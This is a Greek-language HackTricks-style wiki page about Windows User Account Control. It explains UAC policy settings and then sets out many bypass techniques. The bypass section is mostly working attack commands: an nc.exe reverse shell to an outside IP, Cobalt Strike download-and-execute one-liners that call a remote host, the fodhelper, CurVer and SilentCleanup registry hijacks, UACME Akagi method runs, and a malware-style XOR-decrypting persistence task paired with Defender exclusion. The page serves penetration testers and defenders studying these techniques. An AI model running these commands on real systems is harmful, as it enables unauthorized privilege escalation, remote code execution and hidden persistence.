# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί ένα **prompt συγκατάθεσης για δραστηριότητες που απαιτούν elevated δικαιώματα**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity` και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελεί εργασίες που **ενδέχεται να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες εκτελούνται πάντα **στο security context ενός λογαριασμού που δεν είναι administrator**, εκτός αν ένας administrator εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να αποκτήσουν πρόσβαση επιπέδου administrator στο σύστημα για να εκτελεστούν. Είναι μια δυνατότητα ευκολίας που προστατεύει τους administrators από μη επιθυμητές αλλαγές, αλλά δεν θεωρείται security boundary.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν το UAC είναι ενεργοποιημένο, ένας χρήστης administrator λαμβάνει 2 tokens: ένα standard user token, για την εκτέλεση κανονικών ενεργειών με medium integrity, και ένα με τα admin privileges.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) αναλύει σε μεγάλο βάθος τον τρόπο λειτουργίας του UAC και περιλαμβάνει τη διαδικασία logon, την εμπειρία χρήστη και την αρχιτεκτονική του UAC.<sup>[[2]](#references)</sup> Οι administrators μπορούν να χρησιμοποιούν security policies για να ρυθμίσουν τον τρόπο λειτουργίας του UAC σύμφωνα με τον οργανισμό τους σε τοπικό επίπεδο (χρησιμοποιώντας το secpol.msc) ή να τις ρυθμίσουν και να τις προωθήσουν μέσω Group Policy Objects (GPO) σε περιβάλλον domain του Active Directory. Οι διάφορες ρυθμίσεις αναλύονται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 Group Policy settings που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει περισσότερες λεπτομέρειες:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Λειτουργία Admin Approval Mode για τον ενσωματωμένο λογαριασμό Administrator](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Συμπεριφορά του elevation prompt για administrators σε Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Συμπεριφορά του elevation prompt για standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Εντοπισμός εγκαταστάσεων εφαρμογών και εμφάνιση prompt για elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Elevation μόνο εκτελέσιμων αρχείων που είναι signed και validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Elevation μόνο UIAccess εφαρμογών που είναι εγκατεστημένες σε secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Εκτέλεση όλων των administrators σε Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Επιτρέπεται σε UIAccess εφαρμογές να εμφανίζουν prompt για elevation χωρίς χρήση του secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Μετάβαση στο secure desktop κατά την εμφάνιση prompt για elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize αποτυχίες εγγραφής αρχείων και registry σε τοποθεσίες ανά χρήστη](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies για την εγκατάσταση software στα Windows

Οι **τοπικές security policies** ("secpol.msc" στα περισσότερα συστήματα) είναι ρυθμισμένες από προεπιλογή ώστε να **εμποδίζουν users που δεν είναι admins να πραγματοποιούν εγκαταστάσεις software**. Αυτό σημαίνει ότι, ακόμη και αν ένας non-admin user μπορεί να κατεβάσει τον installer του software σας, δεν θα μπορεί να τον εκτελέσει χωρίς λογαριασμό administrator.

### Registry Keys για εξαναγκασμό του UAC να ζητά elevation

Ως standard user χωρίς admin rights, μπορείτε να βεβαιωθείτε ότι ο "standard" λογαριασμός **θα ζητά credentials μέσω του UAC** όταν επιχειρεί να εκτελέσει συγκεκριμένες ενέργειες. Αυτή η ενέργεια απαιτεί τροποποίηση συγκεκριμένων **registry keys**, για τα οποία χρειάζεστε admin permissions, εκτός αν υπάρχει **UAC bypass** ή ο attacker είναι ήδη logged in ως admin.

Ακόμη και αν ο user ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές αναγκάζουν τον user να **εισαγάγει ξανά τα credentials του λογαριασμού του** για να εκτελέσει administrative actions.

**Στην πράξη, αυτό είναι χρήσιμο μόνο όταν διαθέτετε ήδη elevated token, UAC bypass ή misconfiguration που σας επιτρέπει να αλλάξετε αυτά τα keys· διαφορετικά, η ίδια η registry write μπλοκάρεται.**

Τα registry keys και entries που πρέπει να αλλάξετε είναι τα εξής (με τις default τιμές τους σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί να γίνει και χειροκίνητα μέσω του εργαλείου Local Security Policy. Μετά την αλλαγή, οι administrative operations ζητούν από τον user να εισαγάγει ξανά τα credentials του.

### Σημείωση

**Το User Account Control δεν αποτελεί security boundary.** Επομένως, οι standard users δεν μπορούν να ξεφύγουν από τους λογαριασμούς τους και να αποκτήσουν δικαιώματα administrator χωρίς exploit για local privilege escalation.

### Ζητήστε «πλήρη πρόσβαση στον υπολογιστή» από έναν user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Το Internet Explorer Protected Mode χρησιμοποιεί ελέγχους ακεραιότητας για να αποτρέπει την πρόσβαση διεργασιών υψηλού επιπέδου ακεραιότητας (όπως τα web browsers) σε δεδομένα χαμηλού επιπέδου ακεραιότητας (όπως ο φάκελος προσωρινών αρχείων Internet). Αυτό επιτυγχάνεται με την εκτέλεση του browser με token χαμηλής ακεραιότητας. Όταν ο browser προσπαθεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη ζώνη χαμηλής ακεραιότητας, το λειτουργικό σύστημα ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει την πρόσβαση ανάλογα. Αυτή η λειτουργία συμβάλλει στην αποτροπή επιθέσεων remote code execution από το να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα του συστήματος.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα privileges του χρήστη. Τα privileges ορίζονται ως ο συνδυασμός των δικαιωμάτων και των δυνατοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα credentials του χρήστη, δηλαδή τα credentials που χρησιμοποιούνται για την authentication του χρήστη στον υπολογιστή και σε resources του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να συνδέουν αυτόματα έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο σε περιβάλλοντα kiosk ή για σκοπούς testing. Χρησιμοποιήστε το μόνο σε ασφαλή συστήματα, καθώς εκθέτει το password στο registry.

Ορίστε τα ακόλουθα keys χρησιμοποιώντας τον Registry Editor ή το `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Για να επαναφέρετε τη φυσιολογική συμπεριφορά σύνδεσης, ορίστε το `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι, αν έχετε graphical access στο victim, το UAC bypass είναι straightforward, καθώς μπορείτε απλώς να κάνετε click στο "Yes" όταν εμφανιστεί το UAC prompt

Το UAC bypass απαιτείται στην ακόλουθη περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε context μέσης ακεραιότητας και ο χρήστης σας ανήκει στο administrators group**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ δυσκολότερο να γίνει bypass του UAC όταν βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always), σε σχέση με οποιοδήποτε από τα άλλα επίπεδα (Default).**

### Γρήγορο triage από shell μέσης ακεραιότητας

Πριν επιχειρήσετε ένα bypass, επιβεβαιώστε ότι βρίσκεστε στο σωστό σενάριο και αντιστοιχίστε το build του host με γνωστές λειτουργικές μεθόδους:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Πρακτικές σημειώσεις:
- Αν `EnableLUA=0`, δεν χρειάζεστε bypass: οποιοδήποτε admin token μπορεί να ζητήσει απευθείας υψηλή ακεραιότητα.
- `ConsentPromptBehaviorAdmin=2` ή `5` είναι το συνηθισμένο σενάριο για auto-elevate / COM-based bypasses.
- Το `Always Notify` αυξάνει τον βαθμό δυσκολίας, αλλά θα πρέπει και πάλι να δοκιμάσετε το ακριβές build αντί να υποθέσετε αποτυχία: το UACME εξακολουθεί να καταγράφει ορισμένες μεθόδους `AlwaysNotify compatible` σε σύγχρονα Windows builds.<sup>[[3]](#references)</sup>

### Το UAC απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**), μπορείτε να **εκτελέσετε ένα reverse shell με admin δικαιώματα** (επίπεδο υψηλής ακεραιότητας) χρησιμοποιώντας κάτι όπως:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** βασικό UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχετε ένα shell με έναν χρήστη που ανήκει στην ομάδα Administrators, μπορείτε να **κάνετε mount το C$** shared μέσω SMB (file system) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε ολόκληρο το file system** (ακόμα και στον home folder του Administrator).

> [!WARNING]
> **Φαίνεται ότι αυτό το trick δεν λειτουργεί πλέον**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Οι τεχνικές του Cobalt Strike λειτουργούν μόνο αν το UAC δεν έχει ρυθμιστεί στο μέγιστο επίπεδο ασφάλειας
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
Τα **Empire** και **Metasploit** διαθέτουν επίσης αρκετά modules για το **bypass** του **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Τα auto-elevated COM objects παραμένουν μια πρακτική επιφάνεια UAC σε σύγχρονα builds. Το `ICMLuaUtil` εξακολουθεί να καταγράφεται από το UACME ως λειτουργικό στα τρέχοντα Windows branches, ενώ τα offensive εργαλεία συνεχίζουν να προσαρμόζουν το `CMSTPLUA`, συνδυάζοντας μια interactive desktop process, 64-bit execution και, μερικές φορές, PEB/process masquerading πριν από την κλήση του COM Elevation Moniker.<sup>[[3]](#references)</sup>

Πρακτικές συμβουλές:
- Προτιμήστε μια **64-bit** process στο **interactive session** του χρήστη (συνήθως το `explorer.exe` ή ένα child του).
- Αν ένα raw shell αποτύχει, δοκιμάστε ξανά από ένα BOF / UACME implementation αντί για ένα naive `CreateProcess` wrapper.
- Αναμένετε ότι η child execution θα πραγματοποιηθεί σε μια **ξεχωριστή elevated process**· πολλά BOFs δεν κάνουν elevate το τρέχον beacon in-place.

### KRBUACBypass

Documentation και tool στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

Το [**UACME**](https://github.com/hfiref0x/UACME) είναι μια συλλογή από UAC bypass techniques. Κάντε compile με Visual Studio ή MSBuild· το build δημιουργεί αρκετά executables (για παράδειγμα, `Source\Akagi\output\x64\Debug\Akagi.exe`), επομένως επιλέξτε τη method που είναι κατάλληλη για το target build.<sup>[[3]](#references)</sup>\
Προσοχή: ορισμένα bypasses εκκινούν ορατά προγράμματα ή prompts που μπορεί να ειδοποιήσουν τον χρήστη.<sup>[[3]](#references)</sup>

Το UACME διαθέτει το **build version από το οποίο άρχισε να λειτουργεί κάθε technique**.<sup>[[3]](#references)</sup> Μπορείτε να αναζητήσετε μια technique που επηρεάζει τις εκδόσεις σας:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [αυτή](https://en.wikipedia.org/wiki/Windows_10_version_history) τη σελίδα, βρίσκετε την έκδοση Windows `1607` από τις εκδόσεις build.

Μια πρακτική ροή εργασίας είναι να **αξιολογήσετε πρώτα το build του host** και, μόνο έπειτα, να εκτελέσετε τη μέθοδο που αντιστοιχεί:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- Το `WinPwnage` συγκρίνει γρήγορα το τοπικό build με τις γνωστές μεθόδους UAC, κάτι που είναι χρήσιμο για γρήγορη απόρριψη των ανενεργών PoCs.<sup>[[4]](#references)</sup>
- Το `UACME` παραμένει ο καλύτερος δημόσιος κατάλογος για την αντιστοίχιση ενός bypass σε συγκεκριμένο build. Η έκδοση 3.7.1 πρόσθεσε τις μεθόδους 83–85, ενώ η προηγούμενη έκδοση επανέλεγξε τις υπάρχουσες μεθόδους σε **Windows 11 25H2**. Ελέγξτε ξανά τον πίνακα μεθόδων και τις σημειώσεις έκδοσης, αντί να υποθέτετε ότι ένα παλιό PoC εξακολουθεί να εφαρμόζεται χωρίς αλλαγές.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess chains συμβατά με Always Notify (UACME 3.7.1)

Το `Always Notify` δεν εξαλείφει κάθε UAC bypass. Το UACME 3.7.1 υλοποιεί τρεις νέες μεθόδους x64 που συνδυάζουν user-controlled environment/protocol state με συμπεριφορά elevated scheduled-task ή UIAccess και τις σημειώνει όλες ως `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** ανακατευθύνετε το `SystemRoot`, ώστε το WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` να κάνει το elevated `taskhostw.exe` side-load το `unifiedconsent.dll`. Το UACME το υποστηρίζει από το Windows 10 build 19041.
- **84 — TabTip:** χρησιμοποιήστε το ίδιο environment-variable primitive εναντίον του UIAccess `TabTip.exe`, το οποίο φορτώνει τα `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ή `rsaenh.dll`, ανάλογα με το build, και στη συνέχεια κάντε pivot από το resulting high-integrity UIAccess context. Το UACME το υποστηρίζει από το Windows 8.1 / Server 2016.
- **85 — Narrator:** κάντε hijack το per-user `feedback-hub` protocol, χειριστείτε το Narrator με `Alt+CapsLock+F` και στη συνέχεια εκκινήστε ένα writable αντίγραφο του `osk.exe`, το οποίο κάνει side-load το `OskSupport.dll`. Αυτό απαιτεί interactive desktop και υποστηρίζεται από το Windows 10 1809 / Server 2019.

Αφού δημιουργήσετε τα payload units και το Akagi, όπως τεκμηριώνεται από το UACME, εκτελέστε τον αντίστοιχο αριθμό μεθόδου (η προαιρετική εντολή είναι από προεπιλογή `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Οι μέθοδοι 84 και 85 εξαρτώνται από το UIAccess/την αλληλεπίδραση με την επιφάνεια εργασίας, επομένως μην περιμένετε να λειτουργήσουν χωρίς αλλαγές από το Session 0 ή από ένα μη διαδραστικό service shell. Και οι τρεις τροποποιούν την κατάσταση του environment/protocol και τοποθετούν DLLs· ελέγξτε την υλοποίηση και αφαιρέστε αυτά τα artifacts μετά τη δοκιμή.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Το trusted binary `fodhelper.exe` εκτελείται αυτόματα με elevated δικαιώματα στα σύγχρονα Windows. Κατά την εκκίνησή του, αναζητά την παρακάτω per-user διαδρομή στο registry χωρίς να επικυρώνει το verb `DelegateExecute`. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διεργασία Medium Integrity (ο user ανήκει στους Administrators) να εκκινήσει μια διεργασία High Integrity χωρίς UAC prompt.

Registry path που αναζητά το fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Βήματα PowerShell (ορίστε το payload σας και, στη συνέχεια, ενεργοποιήστε το)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο του UAC είναι προεπιλεγμένο/lenient (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε το path `sysnative` για να εκκινήσετε ένα 64-bit PowerShell από μια 32-bit process σε 64-bit Windows.
- Το Payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή path προς ένα EXE). Αποφύγετε τα UIs που εμφανίζουν prompts για stealth.

#### Παραλλαγή CurVer/extension hijack (μόνο HKCU)

Πρόσφατα samples που κάνουν abuse του `fodhelper.exe` αποφεύγουν το `DelegateExecute` και, αντί γι' αυτό, κάνουν **redirect το `ms-settings` ProgID** μέσω της per-user τιμής `CurVer`. Το auto-elevated binary εξακολουθεί να επιλύει τον handler υπό το `HKCU`, επομένως δεν απαιτείται admin token για την τοποθέτηση των keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Μόλις αποκτήσει elevated δικαιώματα, το malware συνήθως **απενεργοποιεί future prompts** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0`, και στη συνέχεια εκτελεί πρόσθετο defense evasion (π.χ. `Add-MpPreference -ExclusionPath C:\ProgramData`) και αναδημιουργεί persistence ώστε να εκτελείται με high integrity. Μια τυπική persistence task αποθηκεύει ένα **XOR-encrypted PowerShell script** στον δίσκο και το αποκωδικοποιεί/εκτελεί in-memory κάθε ώρα:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Αυτή η παραλλαγή εξακολουθεί να καθαρίζει το **dropper** και να αφήνει μόνο τα staged payloads, κάνοντας την ανίχνευση να βασίζεται στην παρακολούθηση του hijack του **`CurVer`**, στην παραποίηση του `ConsentPromptBehaviorAdmin`, στη δημιουργία εξαίρεσης του Defender ή σε scheduled tasks που αποκρυπτογραφούν PowerShell στη μνήμη.<sup>[[5]](#references)</sup>

### UAC bypass μέσω του task `SilentCleanup` (`HKCU\Environment\windir`)

Το `SilentCleanup` εκκινεί το `cleanmgr.exe` με τα υψηλότερα δικαιώματα και επεκτείνει το `%windir%` από το user environment. Αν ελέγχετε το `HKCU\Environment\windir`, μπορείτε να ανακατευθύνετε αυτή την επέκταση σε μια αυθαίρετη εντολή και να αποκτήσετε υψηλή ακεραιότητα χωρίς consent dialog.<sup>[[8]](#references)</sup> Αυτή η μέθοδος εξακολουθεί να αξίζει δοκιμή σε πρόσφατα builds, επειδή το UACME διατηρεί την τεχνική ενεργή και η πρόσφατη παρακολούθηση ζητημάτων δείχνει ότι τα Windows 11 24H2 ενδέχεται να απαιτούν μόνο μικρές προσαρμογές στα εισαγωγικά.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Αν το task κάνει quote το path σε εκείνο το build, επανέλαβε με το payload να τελειώνει σε quote (για παράδειγμα `cmd.exe"`). Να καθαρίζεις πάντα το `HKCU\Environment\windir` μετά τη δοκιμή.

#### Περισσότερο UAC bypass

Πολλά κλασικά UAC bypasses που κάνουν abuse σε UI flows, COM objects ή desktop interaction απαιτούν μια **πλήρη interactive session** με το victim· ένα κοινό `nc.exe` shell ή ένα service που εκτελείται στο **Session 0** συχνά δεν επαρκεί.

Συχνά μπορείς να το λύσεις χρησιμοποιώντας μια **meterpreter** session. Κάνε migrate σε μια **process** που έχει την τιμή **Session** ίση με **1**:

![Κάνε point το ms-settings σε ένα custom extension (.thm) και κάνε map αυτό το extension στο payload μας - Περισσότερο UAC bypass: Μπορείς να το πετύχεις χρησιμοποιώντας μια meterpreter session. Κάνε migrate σε μια process που έχει το Session...](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

Αν έχεις πρόσβαση σε **GUI**, μπορείς απλώς να αποδεχτείς το UAC prompt όταν εμφανιστεί· στην πραγματικότητα δεν χρειάζεσαι technical bypass. Επομένως, η απόκτηση μιας GUI session συχνά αρκεί για να παρακάμψεις την πρακτική τριβή που προσθέτει το UAC.

Επιπλέον, αν αποκτήσεις μια GUI session που χρησιμοποιούσε κάποιος (πιθανώς μέσω RDP), υπάρχουν **ορισμένα tools που θα εκτελούνται ως administrator**, από όπου θα μπορούσες να **εκτελέσεις** για παράδειγμα ένα **cmd** **ως admin** απευθείας, χωρίς να σου ζητηθεί ξανά prompt από το UAC, όπως το [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Θορυβώδες brute-force UAC bypass

Αν ο θόρυβος είναι αποδεκτός, ένα tool όπως το [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) μπορεί να ζητά επανειλημμένα elevation μέχρι να το αποδεχτεί ο user.

### Το δικό σου bypass - Βασική μεθοδολογία UAC bypass

Αν ρίξεις μια ματιά στο **UACME**, θα παρατηρήσεις ότι **πολλά UAC bypasses κάνουν abuse σε DLL hijacking** (συχνά κάνοντας ένα elevated binary να φορτώσει ένα DLL ελεγχόμενο από τον attacker από ένα writable path). [Διάβασε αυτό για να μάθεις πώς να εντοπίζεις μια ευπάθεια DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρες ένα binary που θα κάνει **autoelevate** (έλεγξε ότι όταν εκτελείται τρέχει σε high integrity level).
2. Με το procmon βρες events "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψεις** το DLL μέσα σε κάποια **protected paths** (όπως το C:\Windows\System32), όπου δεν έχεις write permissions. Μπορείς να το παρακάμψεις χρησιμοποιώντας:
1. **wusa.exe**: Windows 7,8 και 8.1. Επιτρέπει την εξαγωγή των περιεχομένων ενός CAB file μέσα σε protected paths (επειδή αυτό το tool εκτελείται από high integrity level).
2. **IFileOperation**: Windows 10.
4. Ετοίμασε ένα **script** για να αντιγράψεις το DLL μέσα στο protected path και να εκτελέσεις το vulnerable και autoelevated binary.

### Μια άλλη τεχνική UAC bypass

